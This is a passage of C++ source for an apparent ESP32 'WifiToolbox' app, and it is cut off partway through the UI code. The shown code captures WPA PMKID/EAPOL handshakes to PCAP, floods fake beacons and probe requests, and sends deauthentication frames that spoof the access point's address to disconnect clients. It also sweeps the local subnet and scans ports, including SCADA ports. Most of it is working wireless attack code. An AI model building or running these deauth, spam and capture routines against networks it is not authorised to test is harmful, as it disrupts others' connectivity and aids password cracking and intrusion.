#ifdef ESP_PLATFORM
#include <sdkconfig.h>
#endif

#include <Tactility/DeprecatedPaths.h>
#include <Tactility/Tactility.h>
#include <Tactility/Mutex.h>
#include <Tactility/Timer.h>
#include <Tactility/service/wifi/Wifi.h>

#include "../wifimonitor/PcapWriter.h"

#include <app/event.h>
#include <app/manager.h>
#include <app/start.h>
#include <app/manifest.h>
#include <app/scheduler.h>

#include <lvgl_window_manager/window_manager.h>

#include <lvgl/lvgl.h>
#include <lvgl/widgets/toolbar.h>

#include <tactility/concurrent/thread.h>
#include <tactility/device.h>
#include <tactility/drivers/wifi.h>
#include <tactility/log.h>
#include <tactility/time.h>
#include <tactility/concurrent/task_event_group.h>

#include <atomic>
#include <cstdio>
#include <cstring>
#include <format>
#include <memory>
#include <string>

#if defined(CONFIG_SOC_WIFI_SUPPORTED)
#include <esp_heap_caps.h>
#include <esp_timer.h>
#include <freertos/FreeRTOS.h>
#include <freertos/stream_buffer.h>

// lwIP sockets for the network utilities (ARP/host + SSH/Telnet + port scans).
#include <lwip/sockets.h>
#include <lwip/inet.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/select.h>
#endif

namespace tt::app::wifitoolbox {

constexpr auto* TAG = "WifiToolbox";

extern const ::AppManifest manifest;

namespace {

enum class Screen { Main, Capture, Inject, Network };
enum class InjectMode { Beacon, Probe, Deauth, Sleep };
enum class NetMode { Host, Ssh, Telnet, Port };

constexpr uint32_t POLL_INTERVAL_MS = 200;
constexpr size_t STREAM_BUFFER_SIZE = 1024 * 1024;
constexpr size_t MAX_FRAME_SIZE = 2346;
constexpr uint32_t INJECT_INTERVAL_MS = 50;
constexpr size_t INJECT_BURST = 8;

struct CaptureRecord {
    uint32_t length;
    uint32_t ts_sec;
    uint32_t ts_usec;
    int8_t   rssi;
    uint8_t  channel;
    uint8_t  type;
    uint8_t  reserved;
};

struct PortPreset {
    const char* name;
    const uint16_t ports[10];
    size_t count;
};

static constexpr PortPreset kPortPresets[] = {
    { "Common",      { 21, 22, 23, 25, 53, 80, 110, 443, 445, 8080 }, 10 },
    { "Web",         { 80, 443, 8000, 8080, 8443, 8888 },              6 },
    { "IoT/SCADA",   { 102, 502, 1883, 2000, 5060, 8883, 9000 },       7 },
    { "Windows/SMB", { 135, 137, 139, 445, 3389 },                      5 },
};
constexpr size_t kPortPresetsCount = sizeof(kPortPresets) / sizeof(kPortPresets[0]);

// "Funny SSIDs" built-in list for beacon spam (loosely mirrors Marauder).
static constexpr const char* kFunnySsids[] = {
    "FREE_WIFI", "FBI Surveillance Van", "Get off my lawn", "xfinitywifi", "NETGEAR_5G",
    "Pretty Fly for a Wi-Fi", "This is the Police", "virus.exe", "Loading...",
    "Click here to connect", "Karen's LAN", "Not your WiFi", "Totally Secure",
    "Starbucks Guest", "AnXious", "Kamikaze Clock", "Internet?"
};
constexpr size_t kFunnySsidsCount = sizeof(kFunnySsids) / sizeof(kFunnySsids[0]);

// Channel hopping sequence (2.4 GHz + 5 GHz UNII-1..3). Defined unconditionally so the
// (non-WiFi) simulator build still compiles the UI that references it.
static constexpr uint8_t kChannels[] = {
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13,
    36, 40, 44, 48, 52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144,
    149, 153, 157, 161, 165
};
constexpr size_t kChannelCount = sizeof(kChannels) / sizeof(kChannels[0]);

struct Context {
    uint32_t appInstanceId = 0;
    Screen screen = Screen::Main;
    Device* wifi = nullptr;

    // Capture counters.
    std::atomic<uint32_t> packetCount{0};
    std::atomic<uint32_t> eapolCount{0};
    std::atomic<uint32_t> pmkidCount{0};
    std::atomic<uint32_t> deauthCount{0};
    std::atomic<uint32_t> droppedCount{0};

#if defined(CONFIG_SOC_WIFI_SUPPORTED)
    StreamBufferHandle_t streamBuffer = nullptr;
    uint8_t* streamBufferStorage = nullptr;
    ::Thread* writerThread = nullptr;
    tt::app::wifimonitor::PcapWriter writer;
    std::atomic<bool> writerStop{false};
    std::atomic<uint8_t> currentChannel{0};
    uint8_t lockChannel = 0;
    uint8_t channelIndex = 0;
    uint8_t hopTick = 0;
    uint8_t targetMac[6] = {0};
    bool macFilterEnabled = false;
    uint8_t apBssid[6] = {0};
    bool apBssidKnown = false;
#endif

    // Inject state.
    bool injecting = false;
    InjectMode injectMode = InjectMode::Beacon;
    bool funnySsids = true;
    size_t funnyIndex = 0;
    char injectSsid[33] = {0};
    char targetBssidText[18] = {0};
    uint8_t targetBssid[6] = {0};
    bool targetBssidKnown = false;
    char deauthClientText[18] = {0};
    uint8_t deauthClient[6] = {0};
    bool deauthClientKnown = false;
    uint8_t localMac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};

    // Network scan state (worker thread + shared results).
    std::atomic<bool> netRunning{false};
    bool netDone = false;
    std::atomic<uint32_t> netFound{0};
    Mutex netMutex;
    char netResult[2048] = {0};
    NetMode netMode = NetMode::Host;
    uint32_t netTarget = 0;    // network byte order, for Port mode
    uint16_t netSinglePort = 0;
    uint16_t netPreset = 0;
    bool netTargetOverride = false;
    uint32_t netTargetOverrideAddr = 0; // network byte order
    ::Thread* netThread = nullptr;

    std::unique_ptr<Timer> pollTimer;
    std::unique_ptr<Timer> injectTimer;

    // UI widgets.
    lv_obj_t* body = nullptr;
    lv_obj_t* statusLabel = nullptr;
    lv_obj_t* statsLabel = nullptr;
    lv_obj_t* startButtonLabel = nullptr;
    lv_obj_t* resultLabel = nullptr;
};

// -----------------------------------------------------------------------------
// WiFi helpers
// -----------------------------------------------------------------------------
Device* getWifiDevice() {
    Device* dev = nullptr;
    if (device_get_first_active_by_type(&WIFI_TYPE, &dev) == ERROR_NONE && dev != nullptr) {
        return dev;
    }
    return nullptr;
}

void ensureWifiOn() {
    using enum tt::service::wifi::RadioState;
    auto state = tt::service::wifi::getRadioState();
    if (state == Off || state == OffPending) {
        LOG_I(TAG, "Enabling Wi-Fi radio");
        tt::service::wifi::setEnabled(true);
    }
}

static bool parseMac(const char* text, uint8_t out[6]) {
    if (text == nullptr) return false;
    while (*text == ' ' || *text == '\t') text++;
    const char* p = text;
    auto hex = [](char c) -> int {
        if (c >= '0' && c <= '9') return c - '0';
        if (c >= 'a' && c <= 'f') return 10 + (c - 'a');
        if (c >= 'A' && c <= 'F') return 10 + (c - 'A');
        return -1;
    };
    for (int i = 0; i < 6; ++i) {
        int hi = hex(p[0]);
        int lo = hex(p[1]);
        if (hi < 0 || lo < 0) return false;
        out[i] = static_cast<uint8_t>((hi << 4) | lo);
        p += 2;
        if (i < 5) {
            if (*p != ':') return false;
            ++p;
        }
    }
    while (*p == ' ' || *p == '\t') ++p;
    return *p == '\0';
}

// -----------------------------------------------------------------------------
// Capture engine
// -----------------------------------------------------------------------------
#if defined(CONFIG_SOC_WIFI_SUPPORTED)

static StaticStreamBuffer_t s_streamBufferStruct;
static uint8_t s_scratch[sizeof(CaptureRecord) + MAX_FRAME_SIZE];

static void hopChannel(Context* ctx) {
    uint8_t channel = kChannels[ctx->channelIndex % kChannelCount];
    ctx->channelIndex++;
    ctx->currentChannel.store(channel);
    if (ctx->wifi != nullptr) {
        wifi_set_channel(ctx->wifi, channel);
    }
}

static bool isEapolFrame(const uint8_t* payload, size_t length) {
    if (length < 34) return false;
    for (size_t off = 24; off + 8 <= length && off <= 40; ++off) {
        if (payload[off] == 0xaa && payload[off+1] == 0xaa && payload[off+2] == 0x03 &&
            payload[off+3] == 0x00 && payload[off+4] == 0x00 && payload[off+5] == 0x00 &&
            payload[off+6] == 0x88 && payload[off+7] == 0x8e) {
            return true;
        }
    }
    return false;
}

static bool looksLikePmkid(const uint8_t* payload, size_t length) {
    (void)length;
    for (size_t off = 24; off + 32 <= length && off <= 48; ++off) {
        if (payload[off] == 0xdd && payload[off+1] == 20) {
            int nonzero = 0;
            for (int k = 0; k < 16; ++k) {
                if (payload[off+4+k] != 0) nonzero++;
            }
            if (nonzero >= 12) return true;
        }
    }
    return false;
}

static void onPacket(void* context, const uint8_t* payload, size_t length, WifiPromiscuousPacketInfo info) {
    auto* ctx = static_cast<Context*>(context);
    ctx->currentChannel.store(info.channel);

    if (length >= 22) {
        bool to_ds = (payload[1] & 0x01) != 0;
        bool from_ds = (payload[1] & 0x02) != 0;
        const uint8_t* bssid = (to_ds && !from_ds) ? (payload + 4) : (payload + 16);
        std::memcpy(ctx->apBssid, bssid, 6);
        ctx->apBssidKnown = true;
    }

    if (length == 0 || length > MAX_FRAME_SIZE) {
        ctx->droppedCount.fetch_add(1);
        return;
    }

    if (info.type == WIFI_PROMISCUOUS_PACKET_TYPE_MGMT && length >= 24 && (payload[0] & 0xF0) == 0xC0) {
        // subtype 0xc = deauth
        ctx->deauthCount.fetch_add(1);
    }
    if (info.type == WIFI_PROMISCUOUS_PACKET_TYPE_DATA && isEapolFrame(payload, length)) {
        ctx->eapolCount.fetch_add(1);
        if (looksLikePmkid(payload, length)) {
            ctx->pmkidCount.fetch_add(1);
        }
    }

    if (ctx->macFilterEnabled && length >= 22) {
        bool matched = false;
        for (size_t off = 4; off + 6 <= length && off <= 16; off += 6) {
            if (std::memcmp(payload + off, ctx->targetMac, 6) == 0) {
                matched = true;
                break;
            }
        }
        if (!matched) {
            return;
        }
    }

    int64_t now_us = esp_timer_get_time();
    auto* record = reinterpret_cast<CaptureRecord*>(s_scratch);
    record->length = static_cast<uint32_t>(length);
    record->ts_sec = static_cast<uint32_t>(now_us / 1000000);
    record->ts_usec = static_cast<uint32_t>(now_us % 1000000);
    record->rssi = info.rssi;
    record->channel = info.channel;
    record->type = static_cast<uint8_t>(info.type);
    record->reserved = 0;
    std::memcpy(s_scratch + sizeof(CaptureRecord), payload, length);

    size_t total = sizeof(CaptureRecord) + length;
    if (xStreamBufferSpacesAvailable(ctx->streamBuffer) >= total) {
        xStreamBufferSend(ctx->streamBuffer, s_scratch, total, 0);
        ctx->packetCount.fetch_add(1);
    } else {
        ctx->droppedCount.fetch_add(1);
    }
}

static int32_t captureWriterMain(void* context) {
    auto* ctx = static_cast<Context*>(context);
    std::string path = std::format("{}/wifi-eapol-{}.pcap", getUserHomePath(), (long long)esp_timer_get_time());
    if (!ctx->writer.open(path.c_str())) {
        LOG_E(TAG, "Failed to open capture file %s", path.c_str());
        return 1;
    }
    LOG_I(TAG, "Capturing to %s", path.c_str());

    while (!ctx->writerStop.load() || xStreamBufferBytesAvailable(ctx->streamBuffer) > 0) {
        CaptureRecord record;
        size_t got = xStreamBufferReceive(ctx->streamBuffer, &record, sizeof(record), pdMS_TO_TICKS(100));
        if (got != sizeof(record)) continue;
        uint8_t payload[MAX_FRAME_SIZE];
        size_t plen = record.length > MAX_FRAME_SIZE ? MAX_FRAME_SIZE : record.length;
        size_t pgot = xStreamBufferReceive(ctx->streamBuffer, payload, plen, pdMS_TO_TICKS(100));
        if (pgot != plen) continue;
        ctx->writer.writePacket(record.ts_sec, record.ts_usec, payload, plen, record.rssi, record.channel);
    }
    ctx->writer.close();
    LOG_I(TAG, "Capture stopped");
    return 0;
}

static void joinWriter(Context* ctx) {
    if (ctx->writerThread != nullptr) {
        thread_join(ctx->writerThread, portMAX_DELAY, 10);
        thread_free(ctx->writerThread);
        ctx->writerThread = nullptr;
    }
}

static bool startCapture(Context* ctx) {
    if (ctx->streamBuffer == nullptr) {
        LOG_E(TAG, "Stream buffer not allocated");
        return false;
    }
    joinWriter(ctx);

    ctx->wifi = getWifiDevice();
    if (ctx->wifi == nullptr) {
        LOG_E(TAG, "No Wi-Fi device");
        return false;
    }

    // Pause the WiFi service's auto-connect/scan so the radio stays where we put it while we
    // monitor (hopping or locked), instead of being yanked back onto a saved AP.
    tt::service::wifi::setAutoScanPaused(true);

    if (wifi_set_promiscuous_callback(ctx->wifi, onPacket, ctx) != ERROR_NONE) {
        LOG_E(TAG, "Failed to set promiscuous callback");
        return false;
    }
    if (wifi_set_promiscuous(ctx->wifi, true) != ERROR_NONE) {
        LOG_E(TAG, "Failed to enable promiscuous mode");
        wifi_set_promiscuous_callback(ctx->wifi, nullptr, nullptr);
        return false;
    }

    if (ctx->lockChannel != 0) {
        wifi_set_channel(ctx->wifi, ctx->lockChannel);
        ctx->currentChannel.store(ctx->lockChannel);
    } else {
        hopChannel(ctx);
    }

    ctx->writerStop = false;
    ctx->writerThread = thread_alloc_full("wifi_cap", 8192, captureWriterMain, ctx, tskNO_AFFINITY);
    if (ctx->writerThread == nullptr) {
        wifi_set_promiscuous(ctx->wifi, false);
        wifi_set_promiscuous_callback(ctx->wifi, nullptr, nullptr);
        return false;
    }
    thread_set_priority(ctx->writerThread, THREAD_PRIORITY_LOW);
    thread_start(ctx->writerThread);
    LOG_I(TAG, "Capture started");
    return true;
}

static void stopCapture(Context* ctx) {
    joinWriter(ctx);
    if (ctx->wifi != nullptr) {
        wifi_set_promiscuous(ctx->wifi, false);
        wifi_set_promiscuous_callback(ctx->wifi, nullptr, nullptr);
    }
    tt::service::wifi::setAutoScanPaused(false);
}

#endif // CONFIG_SOC_WIFI_SUPPORTED

// -----------------------------------------------------------------------------
// Injection engine
// -----------------------------------------------------------------------------
#if defined(CONFIG_SOC_WIFI_SUPPORTED)

static size_t buildBeacon(uint8_t* out, const char* ssid, size_t ssidLen, const uint8_t bssid[6]) {
    size_t i = 0;
    out[i++] = 0x80; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = 0x00;
    std::memcpy(out + i, (const uint8_t[]){0xff,0xff,0xff,0xff,0xff,0xff}, 6); i += 6;
    std::memcpy(out + i, bssid, 6); i += 6;
    std::memcpy(out + i, bssid, 6); i += 6;
    out[i++] = 0x00; out[i++] = 0x00;
    std::memset(out + i, 0, 8); i += 8;
    out[i++] = 0x64; out[i++] = 0x00;
    out[i++] = 0x01; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = static_cast<uint8_t>(ssidLen);
    std::memcpy(out + i, ssid, ssidLen); i += ssidLen;
    out[i++] = 0x01; out[i++] = 0x04;
    out[i++] = 0x82; out[i++] = 0x84; out[i++] = 0x8b; out[i++] = 0x96;
    return i;
}

static size_t buildProbeRequest(uint8_t* out, const char* ssid, size_t ssidLen, const uint8_t src[6]) {
    size_t i = 0;
    out[i++] = 0x40; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = 0x00;
    std::memcpy(out + i, (const uint8_t[]){0xff,0xff,0xff,0xff,0xff,0xff}, 6); i += 6;
    std::memcpy(out + i, src, 6); i += 6;
    std::memcpy(out + i, (const uint8_t[]){0xff,0xff,0xff,0xff,0xff,0xff}, 6); i += 6;
    out[i++] = 0x00; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = static_cast<uint8_t>(ssidLen);
    std::memcpy(out + i, ssid, ssidLen); i += ssidLen;
    out[i++] = 0x01; out[i++] = 0x04;
    out[i++] = 0x82; out[i++] = 0x84; out[i++] = 0x8b; out[i++] = 0x96;
    return i;
}

static size_t buildDeauth(uint8_t* out, const uint8_t dest[6], const uint8_t bssid[6], bool bcast) {
    static uint16_t s_deauthSeq = 0;
    s_deauthSeq = (s_deauthSeq + 1) & 0x0FFF;
    uint16_t seq = s_deauthSeq << 4; // fragment(4) | sequence(12)
    size_t i = 0;
    out[i++] = 0xC0; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = 0x00;
    if (bcast) {
        std::memcpy(out + i, (const uint8_t[]){0xff,0xff,0xff,0xff,0xff,0xff}, 6); i += 6;
    } else {
        std::memcpy(out + i, dest, 6); i += 6;
    }
    std::memcpy(out + i, bssid, 6); i += 6;
    std::memcpy(out + i, bssid, 6); i += 6;
    out[i++] = static_cast<uint8_t>(seq & 0xff);
    out[i++] = static_cast<uint8_t>((seq >> 8) & 0xff);
    out[i++] = 0x07; out[i++] = 0x00;
    return i;
}

static void onInjectTick(Context* ctx) {
    if (!ctx->injecting) return;
    if (ctx->wifi == nullptr) {
        ctx->wifi = getWifiDevice();
        if (ctx->wifi == nullptr) return;
    }
    uint8_t frame[MAX_FRAME_SIZE];
    bool usedBssid = ctx->targetBssidKnown;
    const uint8_t* bssid = usedBssid ? ctx->targetBssid : ctx->localMac;

    for (size_t n = 0; n < INJECT_BURST; ++n) {
        size_t len = 0;
        switch (ctx->injectMode) {
            case InjectMode::Beacon: {
                const char* ssid = ctx->injectSsid;
                if (ctx->funnySsids) {
                    ssid = kFunnySsids[ctx->funnyIndex % kFunnySsidsCount];
                    ctx->funnyIndex++;
                }
                size_t sl = std::strlen(ssid);
                if (sl > 32) sl = 32;
                len = buildBeacon(frame, ssid, sl, bssid);
                break;
            }
            case InjectMode::Probe: {
                size_t sl = std::strlen(ctx->injectSsid);
                if (sl > 32) sl = 32;
                len = buildProbeRequest(frame, ctx->injectSsid, sl, ctx->localMac);
                break;
            }
            case InjectMode::Sleep:
                len = buildDeauth(frame, ctx->targetMac, usedBssid ? bssid : ctx->localMac, !usedBssid);
                break;
            case InjectMode::Deauth:
                // Targeted when a client MAC is set, otherwise broadcast. Spoof the AP's BSSID
                // as the source (Addr2/Addr3) so clients treat it as the AP deauthenticating them.
                len = buildDeauth(frame, ctx->deauthClient, usedBssid ? bssid : ctx->localMac, !ctx->deauthClientKnown);
                break;
        }
        if (len > 0) {
            wifi_send_raw_frame(ctx->wifi, frame, len);
        }
    }

    // Keep the radio on the channel we're attacking.
    if (ctx->lockChannel != 0) {
        wifi_set_channel(ctx->wifi, ctx->lockChannel);
    }
}

#endif // CONFIG_SOC_WIFI_SUPPORTED

// -----------------------------------------------------------------------------
// Network engine (lwIP sockets)
// -----------------------------------------------------------------------------
#if defined(CONFIG_SOC_WIFI_SUPPORTED)

static int probeHost(uint32_t netOrderIp, uint16_t port, int timeoutMs) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct sockaddr_in addr {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = netOrderIp;

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    int ret = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    int result = -1;
    if (ret == 0) {
        result = 1;
    } else if (errno == EINPROGRESS) {
        fd_set wset;
        FD_ZERO(&wset);
        FD_SET(sock, &wset);
        struct timeval tv {};
        tv.tv_sec = timeoutMs / 1000;
        tv.tv_usec = (timeoutMs % 1000) * 1000;
        int sel = select(sock + 1, nullptr, &wset, nullptr, &tv);
        if (sel > 0) {
            int soerr = 0;
            socklen_t len = sizeof(soerr);
            getsockopt(sock, SOL_SOCKET, SO_ERROR, &soerr, &len);
            if (soerr == 0) result = 1;
            else if (soerr == ECONNREFUSED) result = 0;
            else result = -1;
        } else {
            result = -1;
        }
    } else if (errno == ECONNREFUSED) {
        result = 0;
    } else {
        result = -1;
    }
    close(sock);
    return result;
}

static char* ipToString(uint32_t netOrderIp, char* buf) {
    struct in_addr a {};
    a.s_addr = netOrderIp;
    inet_ntop(AF_INET, &a, buf, 16);
    return buf;
}

static void appendNetResult(Context* ctx, const char* line) {
    ctx->netMutex.withLock([ctx, line] {
        if (std::strlen(ctx->netResult) + std::strlen(line) < sizeof(ctx->netResult) - 1) {
            std::strcat(ctx->netResult, line);
        }
    });
}

static int32_t netWorker(void* context) {
    auto* ctx = static_cast<Context*>(context);
    ctx->netFound = 0;
    char ipStr[16];

    char header[128] = {};
    if (ctx->netMode == NetMode::Port) {
        std::snprintf(header, sizeof(header), "Preset: %s (%u ports)\n",
            kPortPresets[ctx->netPreset].name, (unsigned)kPortPresets[ctx->netPreset].count);
    } else {
        std::snprintf(header, sizeof(header), "Scanning %s/24 ...\n", ipToString(ctx->netTarget & 0xffffff00u, ipStr));
    }
    ctx->netMutex.withLock([ctx, header] {
        ctx->netResult[0] = '\0';
        std::strncpy(ctx->netResult, header, sizeof(ctx->netResult) - 1);
    });

    char line[128];
    uint32_t found = 0;

    if (ctx->netMode == NetMode::Port) {
        uint32_t target = ctx->netTarget;
        const PortPreset& preset = kPortPresets[ctx->netPreset];
        for (size_t p = 0; p < preset.count; ++p) {
            int r = probeHost(target, preset.ports[p], 250);
            if (r == 1) {
                ++found;
                std::snprintf(line, sizeof(line), "%s:%u open\n", ipToString(target, ipStr), (unsigned)preset.ports[p]);
                appendNetResult(ctx, line);
            }
        }
    } else {
        uint32_t base24 = ctx->netTarget & 0xffffff00u;
        uint16_t port = (ctx->netMode == NetMode::Ssh) ? 22 : (ctx->netMode == NetMode::Telnet ? 23 : 80);
        for (unsigned host = 1; host <= 254; ++host) {
            uint32_t ip = base24 | host;
            // Host/ARP sweep treats "host responded" (port open OR refused) as alive;
            // SSH/Telnet only report hosts where the target port is open.
            int r = probeHost(ip, port, 300);
            if (r == 1) {
                ++found;
                std::snprintf(line, sizeof(line), "%s:%u open\n", ipToString(ip, ipStr), (unsigned)port);
                appendNetResult(ctx, line);
            } else if (r == 0 && ctx->netMode == NetMode::Host) {
                ++found;
                std::snprintf(line, sizeof(line), "%s:host up\n", ipToString(ip, ipStr));
                appendNetResult(ctx, line);
            }
        }
    }

    ctx->netFound = found;
    ctx->netDone = true;
    ctx->netRunning = false;
    return 0;
}

static void startNetScan(Context* ctx, NetMode mode, uint16_t singlePort, uint16_t preset) {
    if (ctx->netRunning.load()) {
        LOG_W(TAG, "Network scan already running");
        return;
    }
    ctx->wifi = getWifiDevice();
    Device* dev = ctx->wifi;
    if (dev == nullptr) {
        LOG_W(TAG, "No Wi-Fi device for network scan");
        return;
    }
    char ipBuf[16] = {};
    error_t err = wifi_station_get_ipv4_address(dev, ipBuf);
    if (err != ERROR_NONE || ipBuf[0] == '\0') {
        LOG_W(TAG, "Not connected - network scan needs an IP");
        return;
    }
    struct in_addr our {};
    if (inet_pton(AF_INET, ipBuf, &our) != 1) {
        LOG_W(TAG, "Bad IP %s", ipBuf);
        return;
    }
    ctx->netMode = mode;
    ctx->netTarget = our.s_addr;
    if (mode == NetMode::Port && ctx->netTargetOverride) {
        ctx->netTarget = ctx->netTargetOverrideAddr;
    }
    ctx->netSinglePort = singlePort;
    ctx->netPreset = preset;
    ctx->netDone = false;
    ctx->netRunning = true;

    ctx->netThread = thread_alloc_full("net_scan", 8192, netWorker, ctx, tskNO_AFFINITY);
    if (ctx->netThread != nullptr) {
        thread_set_priority(ctx->netThread, THREAD_PRIORITY_LOW);
        thread_start(ctx->netThread);
        LOG_I(TAG, "Network scan started (mode=%d)", (int)mode);
    } else {
        ctx->netRunning = false;
    }
}

#endif // CONFIG_SOC_WIFI_SUPPORTED

// -----------------------------------------------------------------------------
// UI
// -----------------------------------------------------------------------------
static void showMainScreen(Context* ctx);
static void showCaptureScreen(Context* ctx);
static void showInjectScreen(Context* ctx);
static void showNetworkScreen(Context* ctx);

static void ShowScreen(Context* ctx, Screen screen) {
    ctx->screen = screen;
    if (ctx->body != nullptr) {
        lv_obj_clean(ctx->body);
    }
    ctx->statusLabel = nullptr;
    ctx->statsLabel = nullptr;
    ctx->startButtonLabel = nullptr;
    ctx->resultLabel = nullptr;
    switch (screen) {
        case Screen::Main: showMainScreen(ctx); break;
        case Screen::Capture: showCaptureScreen(ctx); break;
        case Screen::Inject: showInjectScreen(ctx); break;
        case Screen::Network: showNetworkScreen(ctx); break;
    }
}

static void onBackPressed(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    if (ctx->screen == Screen::Main) {
        app_event_emit_close(ctx->appInstanceId);
    } else {
        ShowScreen(ctx, Screen::Main);
    }
}

// ---- Main screen ----
static void addMenuButton(Context* ctx, const char* text, void (*cb)(lv_event_t*)) {
    auto* btn = lv_button_create(ctx->body);
    lv_obj_set_width(btn, LV_PCT(100));
    lv_obj_set_height(btn, 44);
    auto* label = lv_label_create(btn);
    lv_label_set_text(label, text);
    lv_obj_center(label);
    lv_obj_add_event_cb(btn, cb, LV_EVENT_SHORT_CLICKED, ctx);
}

static void onGoCapture(lv_event_t* e) { ShowScreen(static_cast<Context*>(lv_event_get_user_data(e)), Screen::Capture); }
static void onGoNetwork(lv_event_t* e) { ShowScreen(static_cast<Context*>(lv_event_get_user_data(e)), Screen::Network); }

static void setInjectModeAndGo(Context* ctx, InjectMode mode) {
    ctx->injectMode = mode;
    ShowScreen(ctx, Screen::Inject);
}
static void onGoBeacon(lv_event_t* e) { setInjectModeAndGo(static_cast<Context*>(lv_event_get_user_data(e)), InjectMode::Beacon); }
static void onGoProbe(lv_event_t* e) { setInjectModeAndGo(static_cast<Context*>(lv_event_get_user_data(e)), InjectMode::Probe); }
static void onGoDeauth(lv_event_t* e) { setInjectModeAndGo(static_cast<Context*>(lv_event_get_user_data(e)), InjectMode::Deauth); }
static void onGoSleep(lv_event_t* e) { setInjectModeAndGo(static_cast<Context*>(lv_event_get_user_data(e)), InjectMode::Sleep); }

static void showMainScreen(Context* ctx) {
    addMenuButton(ctx, "PMKID / EAPOL Capture", onGoCapture);
    addMenuButton(ctx, "Beacon Spam", onGoBeacon);
    addMenuButton(ctx, "Probe Flood", onGoProbe);
    addMenuButton(ctx, "Deauth (targeted + broadcast)", onGoDeauth);
    addMenuButton(ctx, "Association Sleep", onGoSleep);
    addMenuButton(ctx, "WiFi + Net Utilities", onGoNetwork);
}

// ---- Capture screen ----
static void onCaptureStartStop(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
#if defined(CONFIG_SOC_WIFI_SUPPORTED)
    if (ctx->writerThread != nullptr || ctx->injecting) {
        // Stopping: tear down injection if it's the active capture path.
        if (ctx->injecting) {
            ctx->injecting = false;
            ctx->injectTimer->stop();
        }
        stopCapture(ctx);
    } else {
        ensureWifiOn();
        ctx->packetCount = 0;
        ctx->eapolCount = 0;
        ctx->pmkidCount = 0;
        ctx->deauthCount = 0;
        startCapture(ctx);
    }
#endif
}

static void onCaptureChannelChanged(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    auto* dropdown = static_cast<lv_obj_t*>(lv_event_get_target(event));
    uint32_t index = lv_dropdown_get_selected(dropdown);
    ctx->lockChannel = (index == 0) ? 0 : kChannels[index - 1];
    if (ctx->wifi != nullptr && ctx->lockChannel != 0) {
        wifi_set_channel(ctx->wifi, ctx->lockChannel);
    }
}

static void onCaptureMacChanged(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    auto* textarea = static_cast<lv_obj_t*>(lv_event_get_target(event));
    uint8_t mac[6];
    if (parseMac(lv_textarea_get_text(textarea), mac)) {
        std::memcpy(ctx->targetMac, mac, 6);
        ctx->macFilterEnabled = true;
    } else {
        ctx->macFilterEnabled = false;
    }
}

static void showCaptureScreen(Context* ctx) {
    auto* label = lv_label_create(ctx->body);
    lv_label_set_text(label, "Captures 802.11 EAPOL/PMKID to PCAP.");
    ctx->statusLabel = lv_label_create(ctx->body);
    lv_label_set_text(ctx->statusLabel, "Stopped");

    auto* channelDropdown = lv_dropdown_create(ctx->body);
    std::string options = "Auto (hop)";
    for (uint8_t ch : kChannels) options += "\n" + std::to_string(ch);
    lv_dropdown_set_options(channelDropdown, options.c_str());
    lv_dropdown_set_selected(channelDropdown, 0);
    lv_obj_set_width(channelDropdown, LV_PCT(100));
    lv_obj_add_event_cb(channelDropdown, onCaptureChannelChanged, LV_EVENT_VALUE_CHANGED, ctx);

    auto* macTextarea = lv_textarea_create(ctx->body);
    lv_textarea_set_placeholder_text(macTextarea, "Filter MAC (blank = all), e.g. 34:3e:a4:7e:90:45");
    lv_textarea_set_one_line(macTextarea, true);
    lv_obj_set_width(macTextarea, LV_PCT(100));
    lv_obj_add_event_cb(macTextarea, onCaptureMacChanged, LV_EVENT_VALUE_CHANGED, ctx);

    auto* button = lv_button_create(ctx->body);
    lv_obj_set_width(button, LV_PCT(100));
    ctx->startButtonLabel = lv_label_create(button);
    lv_label_set_text(ctx->startButtonLabel, "Start");
    lv_obj_center(ctx->startButtonLabel);
    lv_obj_add_event_cb(button, onCaptureStartStop, LV_EVENT_SHORT_CLICKED, ctx);

    ctx->statsLabel = lv_label_create(ctx->body);
    lv_label_set_text(ctx->statsLabel, "");
}

// ---- Inject screen ----
static void onInjectStartStop(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
#if defined(CONFIG_SOC_WIFI_SUPPORTED)
    ctx->injecting = !ctx->injecting;
    if (ctx->injecting) {
        ensureWifiOn();
        if (ctx->wifi == nullptr) ctx->wifi = getWifiDevice();
        if (ctx->wifi != nullptr && ctx->lockChannel != 0) {
            wifi_set_channel(ctx->wifi, ctx->lockChannel);
        }
        ctx->injectTimer->start();
    } else {
        ctx->injectTimer->stop();
    }
#endif
}

static void onInjectSsidChanged(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    auto* ta = static_cast<lv_obj_t*>(lv_event_get_target(event));
    std::strncpy(ctx->injectSsid, lv_textarea_get_text(ta), sizeof(ctx->injectSsid) - 1);
    ctx->injectSsid[sizeof(ctx->injectSsid) - 1] = '\0';
}

static void onInjectBssidChanged(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    auto* ta = static_cast<lv_obj_t*>(lv_event_get_target(event));
    std::strncpy(ctx->targetBssidText, lv_textarea_get_text(ta), sizeof(ctx->targetBssidText) - 1);
    ctx->targetBssidText[sizeof(ctx->targetBssidText) - 1] = '\0';
    ctx->targetBssidKnown = parseMac(ctx->targetBssidText, ctx->targetBssid);
}

static void onInjectChannelChanged(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    auto* dropdown = static_cast<lv_obj_t*>(lv_event_get_target(event));
